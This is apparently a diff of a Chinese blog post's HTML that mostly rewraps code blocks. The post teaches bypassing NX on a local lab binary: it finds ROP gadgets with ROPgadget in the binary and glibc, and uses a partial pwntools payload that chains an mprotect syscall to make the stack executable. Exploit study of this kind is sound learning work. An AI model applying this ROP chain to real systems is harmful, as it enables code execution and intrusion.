@@ -71,7 +71,7 @@
 
 <p>之前使用 <code class="highlighter-rouge">vmmap</code> 命令的时候会注意到有一列是内存地址的权限，<code class="highlighter-rouge">rwx</code> 和文件系统的一致，NX 不可执行就是没有 <code class="highlighter-rouge">x</code> 权限，当然这不是绝对的，使用 <code class="highlighter-rouge">mprotect</code> 可以修改这个权限，这样的话，就可以在栈上执行 shellcode 了。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ vmmap
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ vmmap
 Start              End                Perm	Name
 0x00400000         0x00401000         r-xp	/home/virusdefender/Desktop/pwn/new/vuln
 0x00600000         0x00601000         r--p	/home/virusdefender/Desktop/pwn/new/vuln
@@ -92,8 +92,7 @@ Start              End                Perm	Name
 0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
 0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
 0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>函数原型是 <code class="highlighter-rouge">int mprotect(void *addr, size_t len, int prot);</code>，<code class="highlighter-rouge">addr</code> 是内存地址开头，<code class="highlighter-rouge">len</code> 是长度，<code class="highlighter-rouge">prot</code> 就是权限位，在 manpage 上有 <code class="highlighter-rouge">PROT_WRITE</code>、<code class="highlighter-rouge">PROT_EXEC</code>、<code class="highlighter-rouge">PROT_READ</code> 等几项，权限是位运算之后的数字，根据宏定义， <code class="highlighter-rouge">rwx</code> 就是 <code class="highlighter-rouge">0x1 | 0x2 | 0x4</code>。</p>
 
@@ -103,27 +102,25 @@ Start              End                Perm	Name
 
 <p><code class="highlighter-rouge">mprotecct</code> 有三个参数，就会使用 <code class="highlighter-rouge">rdi, rsi, rdx</code> 寄存器。如果想让整个栈区可执行的话，在 <code class="highlighter-rouge">vmmap</code> 可以获取栈区的开头和结尾地址，那三个寄存器的值就分别是 <code class="highlighter-rouge">0x00007ffffffde000</code>、<code class="highlighter-rouge">0x00007ffffffff000 - 0x00007ffffffde000</code> 和 <code class="highlighter-rouge">0x1 | 0x2 | 0x4</code>。然后在调用 <code class="highlighter-rouge">mproect</code> 系统系统调用的时候，<code class="highlighter-rouge">rax</code> 寄存器是系统调用号 <code class="highlighter-rouge">0xa</code>。所以按照之前的文章，只要能找到下面这些 gadget 就可以了。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>pop rdi; ret;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pop rdi; ret;
 pop rsi; ret;
 pop rdx; ret;
 pop rax; ret;
 syscall; ret;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>但是有些事情总不会太直接，能在二进制文件中只能找到两个 gadget，其中第二个有一个寄存器是没用的，但是并不影响。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>➜  new ROPgadget --binary vuln | grep "pop rdi"
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new ROPgadget --binary vuln | grep "pop rdi"
 0x0000000000400803 : pop rdi ; ret
 
 ➜  new ROPgadget --binary vuln | grep "pop rsi"
 0x0000000000400801 : pop rsi ; pop r15 ; ret
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>这个时候可以去 glibc 中找了。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code># 这个文件处理比较慢，可以先保存下结果
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 这个文件处理比较慢，可以先保存下结果
 ➜  new ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 &gt; libc.gadget
 
 ➜  new grep "pop rdx ; ret" libc.gadget
@@ -134,8 +131,7 @@ syscall; ret;
 
 ➜  new grep "syscall ; ret" libc.gadget
 0x00000000000bc375 : syscall ; ret
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>如果已知 glibc 的加载基址，使用基址加上上面的地址就可以了，这个基址目前可以在 <code class="highlighter-rouge">vmmap</code> 或者 <code class="highlighter-rouge">ldd</code> 中看到。</p>
 
@@ -145,14 +141,13 @@ syscall; ret;
 
 <p>我选择了先 <code class="highlighter-rouge">pop rax</code> 为 <code class="highlighter-rouge">0x9</code>，然后 <code class="highlighter-rouge">add rax, 1； ret</code> 的 gadget。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>➜  new grep "add rax, 1 ; ret" libc.gadget
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new grep "add rax, 1 ; ret" libc.gadget
 0x00000000000abf40 : add rax, 1 ; ret
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="shellcode">shellcode</h3>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">student</span> <span class="o">=</span> <span class="mh">0x7fffffffe2f0</span>
 <span class="n">shellcode</span> <span class="o">=</span> <span class="s">"1925</span><span class="se">\n</span><span class="s">"</span>
@@ -193,14 +188,12 @@ syscall; ret;
 <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">student</span><span class="p">)</span>
 
 <span class="k">print</span> <span class="n">shellcode</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>运行后可以看到栈区的内存已经是 <code class="highlighter-rouge">rwx</code> 的权限了。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
+</code></pre></div></div>
 
 
 
